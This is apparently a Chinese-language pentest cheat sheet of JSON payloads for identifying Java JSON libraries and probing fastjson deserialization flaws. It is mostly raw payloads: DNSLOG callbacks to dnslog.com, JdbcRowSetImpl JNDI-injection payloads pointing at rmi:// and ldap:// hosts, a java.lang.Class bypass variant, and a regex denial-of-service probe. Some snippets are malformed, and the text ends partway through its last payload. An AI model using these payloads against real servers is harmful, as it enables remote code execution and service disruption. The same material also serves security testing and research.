## 鉴别
### DNSLOG
```json
{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog.com"}}
```

```json
{{"@type":"java.net.URL","val":"http://dnslog.com"}:"a"}
```

### 报错解析
```json
{"@type":"whatever"}
```

### 鉴别org.json
```json
{a:'\r'}
```

### 鉴别gson
#### 浮点类型精度丢失
```json
{a:1.111111111111111111111111111}
```

#### 注释符
```json
#\r\n{a:1}
```

### 鉴别jackson
#### 浮点类型精度丢失
```json
{a:1.111111111111111111111111111}
```
#### 注释符
```json
{a:1}/*#aaaa
```
#### 多余的类成员
```json
{"name":"a","age":18}
```

## 探测
### 延迟探测
#### fastjson 1.1.15-1.2.24  
```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/badClassName", "autoCommit":true}
```json
通用payload,用于parseObject</br> 
`{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:8088/badClassName", "autoCommit":true}}""}`  
#### fastjson 1.2.9-1.2.47
```json
    {
        "a":{
            "@type":"java.lang.Class",
            "val":"com.sun.rowset.JdbcRowSetImpl"
        },
        "b":{
            "@type":"com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName":"ldap://localhost:808/badNameClass",
            "autoCommit":true
        }
    }
```
通用payload,可用于parseObject

```json
{"@type":"com.alibaba.fastjson.JSONObject",{
        "a":{
            "@type":"java.lang.Class",
            "val":"com.sun.rowset.JdbcRowSetImpl"
        },
        "b":{
            "@type":"com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName":"ldap://localhost:8088/badNameClass",
            "autoCommit":true
        }
    }}""}
```


#### Fastjson 1.2.36 - 1.2.62
利用正则dos洞，进行探测。逐步加a,直到延迟为止  
    {
        "regex":{
            "$ref":"$[blue rlike '^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$']"
        },
        "blue":"aaaaaaaaaaaa!"
    }
#### 异常回显
    {
        "@type": "java.lang.AutoCloseable"
